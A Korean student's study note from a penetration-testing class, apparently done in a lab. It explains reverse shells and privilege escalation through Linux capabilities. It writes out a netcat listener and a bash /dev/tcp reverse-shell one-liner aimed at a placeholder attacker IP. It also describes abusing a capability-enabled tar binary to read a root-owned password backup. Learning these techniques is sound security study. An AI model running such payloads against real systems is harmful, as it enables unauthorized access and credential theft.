# [모의해킹] 인프라 보안 수업 - Kali Linux 리버스 쉘 및 Capabilities 권한 상승 기법

**날짜:** 2026년 5월 13일  
**주제:** Kali Linux, Reverse Shell, Linux Capabilities, Privilege Escalation (권한 상승), GTFOBins

## 📝 오늘 배운 내용 상세 요약

### 1. 리버스 쉘 (Reverse Shell) 연결 기법
* **개념:** 방화벽의 인바운드 정책(외부에서 내부로의 접속 차단)을 우회하기 위해, 타겟 머신이 공격자(Kali Linux)의 PC로 스스로 접속하게 만드는 강력한 해킹 기법입니다.
* **공격 과정:** 
  1. 공격자 PC에서 `nc -lvnp 5555` 명령어로 수신기(Listener)를 열어두고 대기합니다.
  2. 타겟 머신에서 취약점을 이용해 `bash -i >& /dev/tcp/[공격자IP]/5555 0>&1` 명령어를 실행시켜 공격자에게 쉘을 던져줍니다(획득).
* **주의점:** 명령어 입력 시 방향 지시등(`>&`) 같은 리눅스 특수 기호를 누락하거나, 타겟과 공격자의 IP를 혼동하여 반대로 입력하면 `Connection refused` 에러가 발생하므로 정확한 페이로드 작성이 필수적입니다.

### 2. Linux Capabilities를 악용한 권한 상승 (Privilege Escalation)
* **취약점 탐색:** `getcap -r / 2>/dev/null` 명령어를 사용하여 시스템 전체에서 특수 권한(Capabilities)이 부여된 실행 파일을 검색했습니다. (이때 `2>/dev/null`을 사용하여 '권한 없음' 등의 불필요한 표준 에러 메시지를 휴지통으로 버려 터미널 출력을 깔끔하게 정리했습니다.)
* **취약점 발견:** `/home/cyber/tar` 실행 파일에 `cap_dac_read_search=ep` 권한이 부여된 것을 발견했습니다.
  > **💡 참고:** 이 권한은 `tar`가 완전한 root 관리자는 아니지만, '파일의 접근 권한을 무시하고 시스템 내의 모든 파일을 읽을 수 있는 막강한 특권'을 가졌음을 의미합니다.
* **권한 우회 및 탈취 실습:** 일반 유저(`cyber`)는 절대 열어볼 수 없는 root 소유의 비밀번호 백업 파일(`/var/backups/.old_pass.bak`)을, 앞서 발견한 막강한 읽기 권한을 가진 `tar` 명령어를 이용해 강제로 압축했습니다. 이후 다시 압축을 풀어 파일의 소유자를 `cyber`로 '세탁'하는 데 성공하여 중요 비밀번호 내용을 성공적으로 읽어냈습니다.

## 💭 오늘의 회고 및 실무 다짐

### 📌 배운 점
* SUID(SetUID)처럼 파일 자체가 아예 root 권한으로 실행되는 널리 알려진 취약점 외에도, 리눅스의 미세한 권한 설정인 **'Capabilities'**를 악용해서 우회적으로 중요 파일을 탈취할 수 있다는 해킹 원리를 실습으로 완벽히 체득했습니다.
* 해킹 공격은 타이밍과 순서가 매우 중요함을 배웠습니다. 리버스 쉘 페이로드를 타겟에 날리기 전, **반드시 해커 PC 쪽에 수신기를 먼저 켜두고 대기**해야만 쉘을 놓치지 않고 받을 수 있습니다.

### 🚨 트러블슈팅 (어려운 점 및 개선할 점)
* **IP 혼동 실수:** 리버스 쉘 페이로드를 작성할 때 타겟 IP와 내(Kali) IP가 헷갈려 자기 자신에게 연결을 시도하는 어이없는 실수를 했습니다.
* **오타의 나비효과:** 명령어의 작은 오타 하나(`>&` 누락)로 인해 실행조차 안 되는 것을 겪으며, 리눅스 환경에서는 기호 하나하나의 의미를 정확히 알고 써야 함을 깨달았습니다.
* **개선점:** 앞으로는 본격적인 공격 전, 텍스트 편집기에 **'Target IP'**와 **'Attacker IP'**를 명확히 적어두고 복사/붙여넣기 하여 실수를 원천 차단하는 치밀한 습관을 들여야겠습니다.

### 💡 실무를 위한 액션 플랜
* `tar` 명령어 외에도 Capabilities 설정 실수로 해킹에 자주 쓰이는 다른 바이너리들(예: `python`, `perl`, `vim` 등)의 실제 권한 상승 사례를 추가로 찾아보고 나만의 기술 블로그에 정리하겠습니다.

### 🤝 함께 나누고 싶은 점
> **해킹은 끈기다!**  
`Unable to connect`, `Connection refused`, `No such file or directory` 등 수많은 에러의 벽에 부딪혔지만, 포기하지 않고 로그와 IP, 오타를 꼼꼼히 역추적해서 결국 타겟 시스템의 프롬프트(`cyber@breakout`)가 내 화면에 떨어졌을 때의 짜릿함은 이루 말할 수 없었습니다. 인내심을 갖고 분석하는 끈기를 다시 한번 느꼈습니다.
